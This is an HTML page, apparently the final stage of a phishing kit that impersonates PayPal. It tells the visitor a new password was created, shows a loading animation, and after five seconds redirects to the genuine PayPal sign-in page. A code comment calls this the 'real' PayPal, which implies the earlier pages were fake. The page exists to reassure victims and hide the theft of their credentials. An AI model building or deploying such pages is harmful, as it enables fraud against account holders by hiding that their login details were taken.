<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
  <title>New password created</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      width: 100%;
      overflow: hidden;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #ffffff;
      color: #111b21;
    }

    .wrapper {
      height: 100vh;
      height: 100dvh;          /* better for modern mobile viewports */
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 0 24px;
      text-align: center;
    }

    .logo {
      width: 88px;
      height: 88px;
      margin-bottom: 40px;
    }

    h1 {
      font-size: 28px;
      font-weight: 700;
      line-height: 1.2;
      margin-bottom: 12px;
      color: #111b21;
    }

    .loading-text {
      font-size: 17px;
      font-weight: 400;
      color: #6b7a89;
    }

    .dots {
      display: inline-block;
      width: 30px;
      text-align: left;
    }

    .dot {
      opacity: 0;
      animation: blink 1.4s infinite both;
    }

    .dot:nth-child(1) { animation-delay: 0s; }
    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 40%  { opacity: 0; }
      60%      { opacity: 1; }
      100%     { opacity: 1; }
    }

    @media (min-width: 480px) {
      .logo   { width: 100px; height: 100px; margin-bottom: 48px; }
      h1      { font-size: 32px; }
      .loading-text { font-size: 18px; }
    }
  </style>
</head>
<body>

  <div class="wrapper">
    <div class="logo">
      <svg viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <rect x="52" y="12" width="64" height="64" rx="8" fill="#4DB3FF" />
        <rect x="18" y="40" width="64" height="64" rx="8" fill="#3BB54A" />
        <rect x="40" y="36" width="48" height="48" rx="6" fill="#FFFFFF" />
        <path d="M50 60 L61 71 L78 50"
              fill="none" stroke="#003087" stroke-width="5"
              stroke-linecap="round" stroke-linejoin="round" />
      </svg>
    </div>

    <h1>New password created</h1>

    <div class="loading-text">
      Just a second
      <span class="dots">
        <span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>
      </span>
    </div>
  </div>

  <script>
    // Redirect to real PayPal sign-in after delay
    setTimeout(() => {
      window.location.replace("https://www.paypal.com/signin?locale.x=en_US");
    }, 5000);
  </script>

</body>
</html>
